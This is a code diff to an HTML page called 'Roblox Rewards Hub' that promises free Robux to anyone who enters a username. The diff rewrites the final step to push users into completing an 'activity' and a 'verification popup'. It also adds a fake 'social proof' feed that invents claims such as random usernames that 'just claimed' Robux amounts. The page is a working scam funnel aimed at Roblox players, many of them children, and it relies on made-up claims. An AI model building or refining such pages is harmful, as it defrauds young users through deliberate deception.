@@ -17,7 +17,7 @@
     
     <!-- STEP 1: Account Connection -->
     <div id="step1" class="step active">
-      <h1 class="hero-title">ROBLOX REWARD HUB</h1>
+      <h1 class="hero-title">ROBLOX REWARDS HUB</h1>
       <p class="hero-subtitle">Enter your username to begin the secure transfer</p>
       
       <div class="input-wrapper">
@@ -85,16 +85,19 @@
     <div id="step4" class="step" style="display: none;">
       <div class="processing-container">
         <div class="spinner"></div>
-        <h2 class="processing-title">Verifying Your Account...</h2>
-        <p class="processing-subtitle">Completing final security check for <span id="selected-amount"></span> Robux</p>
-        <p class="processing-username">Account: <span id="final-username"></span></p>
-        <p class="processing-note">Please complete the verification when it appears</p>
+        <h2 class="processing-title">Almost There!</h2>
+        <p class="processing-subtitle" id="dynamic-claim-text">Complete one activity below to release your <span id="selected-amount"></span> Robux to @<span id="final-username"></span></p>
+        <p class="processing-note">The verification popup will appear automatically</p>
       </div>
     </div>
   </div>
 
+  <!-- Live Activity Feed (Social Proof) -->
+  <div id="activity-feed" class="activity-feed"></div>
+
 <script>
 let selectedUsername = '';
+let selectedAmount = 0;
 
 function searchAccount() {
   const username = document.getElementById('username-input').value.trim();
@@ -148,6 +151,9 @@ function startScanningAnimation() {
 }
 
 function selectReward(amount) {
+  selectedAmount = amount;
+  
+  // Update dynamic text
   document.getElementById('selected-amount').textContent = amount.toLocaleString();
   document.getElementById('final-username').textContent = selectedUsername;
   
@@ -194,6 +200,51 @@ function transitionToStep(stepId) {
     newStep.classList.add('active');
   }, 300);
 }
+
+// Live Activity Feed (Social Proof)
+const activityFeed = document.getElementById('activity-feed');
+const usernames = [
+  'vnc_22', 'RobloxKing77', 'Sarah_x0', 'ProGamer_21', 'Luna_Sky', 
+  'Tyler_xX', 'Maya123', 'EpicPlayer99', 'Ninja_Rob', 'Stella_xo',
+  'Alex_2024', 'BloxMaster', 'GamerGirl_88', 'CoolDude456', 'Zara_11'
+];
+const amounts = [1700, 4500, 10000, 22500];
+
+function showActivityNotification() {
+  const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
+  const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+  
+  const notification = document.createElement('div');
+  notification.className = 'activity-notification';
+  notification.innerHTML = `
+    <span class="activity-icon">✓</span>
+    <span class="activity-text"><strong>${randomUser}</strong> just claimed <strong>${randomAmount.toLocaleString()} R$</strong></span>
+  `;
+  
+  activityFeed.appendChild(notification);
+  
+  // Slide up animation
+  setTimeout(() => {
+    notification.classList.add('show');
+  }, 100);
+  
+  // Remove after 4 seconds
+  setTimeout(() => {
+    notification.classList.remove('show');
+    setTimeout(() => {
+      notification.remove();
+    }, 500);
+  }, 4000);
+}
+
+// Start showing notifications after 2 seconds, then every 7-12 seconds
+setTimeout(() => {
+  showActivityNotification();
+  
+  setInterval(() => {
+    showActivityNotification();
+  }, Math.random() * 5000 + 7000); // Random between 7-12 seconds
+}, 2000);
 </script>
 
 </body>
